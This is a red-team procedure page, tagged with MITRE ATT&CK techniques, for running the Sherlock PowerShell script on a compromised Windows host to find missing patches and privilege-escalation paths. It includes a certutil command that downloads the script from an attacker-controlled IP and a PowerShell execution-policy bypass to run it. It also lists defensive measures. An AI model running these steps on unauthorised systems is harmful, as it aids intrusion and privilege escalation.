---
id: c27c8eba-a5cd-415f-a9a3-c252aa84e3d1
type: procedure
verified: true
submitted: true
created_at: '2019-12-05T23:11:23.199789+00:00'
updated_at: '2023-05-25T19:58:43.927637+00:00'
tactics:
  - '[[tactics/discovery|TA0007 - Discovery]]'
  - '[[tactics/privilege-escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/system-information-discovery|T1082 - System Information
    Discovery]]
  - >-
    [[techniques/file-and-directory-discovery|T1083 - File and Directory
    Discovery]]
sub_techniques: []
platforms:
  - Windows
tags:
  - data-exposure
  - misconfiguration
  - service-attacks
commands:
  - '[[commands/download-file-remote-http-certutil]]'
  - '[[commands/sherlock-import-module-enumerate-vulnerabilities]]'
tools:
  - '[[tools/Sherlock]]'
validated: true
---

# Enumerate Windows Missing Patches Hotfixes Sherlock

## Summary

This procedure uses the Sherlock PowerShell script to audit a compromised Windows system for common privilege escalation vectors, including missing patches, weak permissions, and known exploits like MS15-051.

## Description

Sherlock automates enumeration of Windows misconfigurations and unpatched vulnerabilities by checking against a database of known issues. Run from a low-priv shell, it identifies paths for escalation without manual checks, focusing on kernel exploits, service paths, and hotfixes in CTF or red team ops.

## Requirements

1. PowerShell execution policy allowing scripts (bypass if needed)
2. Internet access from target for initial download (or transfer via existing shell)
3. Writable directory for Sherlock.ps1
4. Windows version 2003-2016 (tool compatibility)

## Defense

Apply all Microsoft patches promptly via WSUS. Restrict PowerShell to constrained language mode and enable script block logging. Audit for unauthorized PS1 downloads and executions in event logs (ID 4104).

## Objectives

1. Identify unpatched vulnerabilities (e.g., MS15-051)
2. Detect permission weaknesses for escalation
3. Gather system info for targeted exploits

## Instructions

### Step 1: Download and Import Sherlock Script

**Context**: Transfer the script to the target using the existing shell.

**Command** ([[commands/download-file-remote-http-certutil]]):
```command_prompt
certutil.exe -urlcache -split -f "http://$_ATTACKER_IP/Sherlock.ps1" C:\Windows\Tasks\Sherlock.ps1
```

> Host Sherlock.ps1 on your HTTP server first. Expected: Download success. Then import: powershell -ep bypass -f C:\Windows\Tasks\Sherlock.ps1.

### Step 2: Run Enumeration and Review Output

**Context**: Execute the vuln check to list potential escalations.

**Command** ([[commands/sherlock-import-module-enumerate-vulnerabilities]]):
```powershell
Find-AllVulns
```

> Run in the shell. Expected output: Table of titles, CVEs, links, and VulnStatus (e.g., Vulnerable for MS15-051). Note architecture (x86/x64) for exploit matching. If non-interactive, append to script execution.
